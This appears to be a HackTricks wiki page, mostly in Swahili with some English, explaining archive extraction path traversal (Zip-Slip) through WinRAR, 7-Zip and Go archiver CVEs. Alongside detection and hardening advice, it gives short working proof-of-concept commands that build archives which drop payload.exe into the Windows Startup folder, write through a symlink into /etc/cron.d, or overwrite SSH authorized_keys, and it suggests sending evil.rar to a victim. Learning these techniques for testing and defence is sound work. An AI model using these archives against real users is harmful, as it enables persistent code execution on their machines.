# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Muhtasari

Miundo mingi ya archive (ZIP, RAR, TAR, 7-ZIP, n.k.) huruhusu kila kipengee kuwa na **internal path** yake. Wakati utiliti ya uchimbaji inaheshimu bila kuchunguza njia hiyo, jina la faili lililotengenezwa likiwa na `..` au **absolute path** (mfano `C:\Windows\System32\`) litaandikwa nje ya saraka iliyochaguliwa na mtumiaji.
Aina hii ya udhaifu inajulikana sana kama *Zip-Slip* au **archive extraction path traversal**.

## Chanzo

1. Mshambuliaji anaunda archive ambamo kichwa kimoja au zaidi cha faili kina:
* Relative traversal sequences (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Absolute paths (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* Au **symlinks** zilizotengenezwa ambazo zinaelekezwa nje ya saraka lengwa (kwa kawaida katika ZIP/TAR kwenye *nix*).
2. Mwadui anachimba archive hiyo kwa kutumia zana iliyo na udhaifu inayomwamini njia iliyojazwa ndani (au kufuata **symlinks**) badala ya kuisafisha au kulazimisha uchimbaji chini ya saraka iliyochaguliwa.
3. Faili inaandikwa katika eneo linalodhibitiwa na mshambuliaji na itatekelezwa/kuingizwa wakati mfumo au mtumiaji itakapoiamsha njia hiyo.

## Mfano wa Dunia Halisi – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR for Windows (including the `rar` / `unrar` CLI, the DLL and the portable source) ilishindwa kuthibitisha majina ya faili wakati wa uchimbaji.
Archive ya RAR yenye madhara iliyo na kipengee kama:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
ingemalizika **nje** ya saraka ya pato iliyochaguliwa na ndani ya saraka ya *Startup* ya mtumiaji. Baada ya kuingia, Windows inaendesha kiotomatiki kila kitu kilichomo hapo, ikitoa *kudumu* RCE.

### Kutengeneza PoC Archive (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Chaguo zilizotumika:
* `-ep`  – hifadhi path za faili kama zilivyo (usifute `./` ya mwanzoni).

Wasilisha `evil.rar` kwa mwathirika na uwaelekeze waweke (extract) kwa build ya WinRAR yenye udhaifu.

### Observed Exploitation in the Wild

ESET iliripoti kampeni za spear-phishing za RomCom (Storm-0978/UNC2596) ambazo zilikuwa na RAR archives zikitumiwa CVE-2025-8088 kupeleka customised backdoors na kurahisisha ransomware operations.

## Newer Cases (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Bug**: ZIP entries that are **symbolic links** zilitumika kama marejeo (dereferenced) wakati wa extraction, zikimruhusu mshambuliaji kutoroka directory ya kusudi na kuandika juu ya paths yoyote. Mwingiliano wa mtumiaji ni tu *kufungua/kuondoa* archive.
* **Affected**: 7-Zip 21.02–24.09 (Windows & Linux builds). Fixed in **25.00** (July 2025) and later.
* **Impact path**: Overwrite `Start Menu/Programs/Startup` or service-run locations → code runs at next logon or service restart.
* **Quick PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
On a patched build `/etc/cron.d` won’t be touched; the symlink is extracted as a link inside /tmp/target.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Bug**: `archiver.Unarchive()` follows `../` and symlinked ZIP entries, writing outside `outputDir`.
* **Affected**: `github.com/mholt/archiver` ≤ 3.5.1 (project now deprecated).
* **Fix**: Switch to `mholt/archives` ≥ 0.1.0 or implement canonical-path checks before write.
* **Minimal reproduction**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Detection Tips

* **Static inspection** – Orodhesha archive entries na angazia kila jina linalojumuisha `../`, `..\\`, *absolute paths* (`/`, `C:`) au entries za aina *symlink* ambazo target yao iko nje ya extraction dir.
* **Canonicalisation** – Hakikisha `realpath(join(dest, name))` bado inaanza na `dest`. Kataa vinginevyo.
* **Sandbox extraction** – Fukua ndani ya directory inayoweza kutupwa (disposable) kwa kutumia extractor *safe* (mfano: `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) na thibitisha kwamba paths zilizotokana zinabaki ndani ya directory.
* **Endpoint monitoring** – Toa alama/taarifa pale matumizi mapya ya executables yanapoandikwa kwenye `Startup`/`Run`/`cron` nafasi kwa muda mfupi baada ya archive kufunguliwa na WinRAR/7-Zip/etc.

## Mitigation & Hardening

1. **Update the extractor** – WinRAR 7.13+ na 7-Zip 25.00+ zina utekelezaji wa kusafisha path/symlink. Zana zote bado hazina auto-update.
2. Extract archives with “**Do not extract paths**” / “**Ignore paths**” inapowezekana.
3. Kwenye Unix, pungua privileges & mount **chroot/namespace** kabla ya extraction; kwenye Windows, tumia **AppContainer** au sandbox.
4. Ikiwa unaandika code maalum, normaliza kwa `realpath()`/`PathCanonicalize()` **kabla ya** kuunda/kuandika, na kata entry yoyote inayotoroka nje ya destination.

## Additional Affected / Historical Cases

* 2018 – Massive *Zip-Slip* advisory by Snyk affecting many Java/Go/JS libraries.
* 2023 – 7-Zip CVE-2023-4011 similar traversal during `-ao` merge.
* 2025 – HashiCorp `go-slug` (CVE-2025-0377) TAR extraction traversal in slugs (patch in v1.2).
* Any custom extraction logic that fails to call `PathCanonicalize` / `realpath` prior to write.

## References

- [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)

{{#include ../banners/hacktricks-training.md}}
